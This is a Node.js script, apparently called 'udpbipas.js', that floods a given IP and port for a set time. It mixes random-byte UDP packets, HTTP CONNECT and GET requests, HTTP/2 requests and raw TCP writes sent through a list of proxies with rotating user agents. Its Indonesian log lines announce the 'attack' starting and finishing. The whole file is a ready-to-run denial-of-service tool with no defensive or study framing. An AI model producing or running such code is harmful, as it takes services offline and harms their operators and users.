const dgram = require('dgram');
const http = require('http');
const http2 = require('http2');
const net = require('net');
const crypto = require('crypto');
const fs = require('fs');

if (process.argv.length !== 5) {
    console.log("Usage: node udpbipas.js <IP> <Port> <time>");
    process.exit(0);
}

const target = process.argv[2];
const port = parseInt(process.argv[3]);
const duration = parseInt(process.argv[4]);

const proxies = fs.readFileSync('proxy.txt', 'utf-8').split('\n').filter(line => line.trim());
const userAgents = fs.readFileSync('ua.txt', 'utf-8').split('\n').filter(line => line.trim());

const udpSocket = dgram.createSocket('udp4');
const startTime = Date.now();

function sendUdpPacket(proxy) {
    const [proxyHost, proxyPort] = proxy.split(':');
    const message = crypto.randomBytes(1024).toString('hex');

    udpSocket.send(message, 0, message.length, port, target, (err) => {
        if (err) console.error(`[ERROR] Gagal kirim paket: ${err.message}`);
    });
}

function sendHttpRequest(proxy, userAgent) {
    const [proxyHost, proxyPort] = proxy.split(':');
    const options = {
        hostname: proxyHost,
        port: proxyPort,
        method: 'CONNECT',
        path: `${target}:${port}`,
    };

    const req = http.request(options);
    req.end();
    req.on('connect', (res, socket) => {
        const requestOptions = {
            host: target,
            port: port,
            method: 'GET',
            path: '/',
            headers: {
                'User-Agent': userAgent,
            },
        };

        const clientRequest = http.request(requestOptions);
        clientRequest.end();
        clientRequest.on('error', () => {});
    });
}

function sendHttp2Request(proxy, userAgent) {
    try {
        const [proxyHost, proxyPort] = proxy.split(':');
        const client = http2.connect(`http://${target}`, {
            createConnection: () => net.connect({ host: proxyHost, port: proxyPort }),
        });
        const req = client.request({ ':path': '/', 'user-agent': userAgent });
        req.end();
        req.on('response', () => client.close());
    } catch (err) {}
}

function sendNetRequest(proxy) {
    const [proxyHost, proxyPort] = proxy.split(':');
    const socket = net.createConnection({ host: proxyHost, port: proxyPort }, () => {
        socket.write(crypto.randomBytes(512).toString('hex'));
        socket.destroy();
    });
    socket.on('error', () => {});
}

console.log("[INFO] Serangan dimulai...");

const attackInterval = setInterval(() => {
    if (Date.now() - startTime > duration * 1000) {
        clearInterval(attackInterval);
        console.log("[INFO] Serangan selesai!");
        process.exit(0);
    }

    const randomProxy = proxies[Math.floor(Math.random() * proxies.length)];
    const randomUserAgent = userAgents[Math.floor(Math.random() * userAgents.length)];

    for (let i = 0; i < 100; i++) {
        sendUdpPacket(randomProxy);
        sendHttpRequest(randomProxy, randomUserAgent);
        sendHttp2Request(randomProxy, randomUserAgent);
        sendNetRequest(randomProxy);
    }
}, 100);
